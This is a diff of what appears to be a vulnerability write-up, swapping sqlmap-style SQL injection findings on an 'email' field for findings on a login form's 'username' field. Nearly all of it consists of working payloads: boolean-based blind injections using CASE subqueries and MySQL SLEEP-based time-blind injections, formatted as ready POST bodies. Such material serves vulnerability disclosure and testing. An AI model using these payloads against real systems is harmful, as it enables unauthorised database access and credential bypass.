@@ -19,14 +19,14 @@
 
 ```
 ---
-Parameter: email (POST)
+Parameter: username (POST)
     Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: email=test@test.com' RLIKE (SELECT (CASE WHEN (8847=8847) THEN 0x7465737440746573742e636f6d ELSE 0x28 END)) AND 'ZHEF'='ZHEF&sub=submit
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: username=admin' AND 4382=(SELECT (CASE WHEN (4382=4382) THEN 4382 ELSE (SELECT 5608 UNION SELECT 7404) END))-- zkRp&password=admin&login=Sign In
 
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: email=test@test.com' AND (SELECT 8859 FROM (SELECT(SLEEP(5)))DjVt) AND 'ZEmv'='ZEmv&sub=submit
+    Payload: username=admin' AND (SELECT 3172 FROM (SELECT(SLEEP(5)))sbzt)-- ljdG&password=admin&login=Sign In
 ---
 
 ```
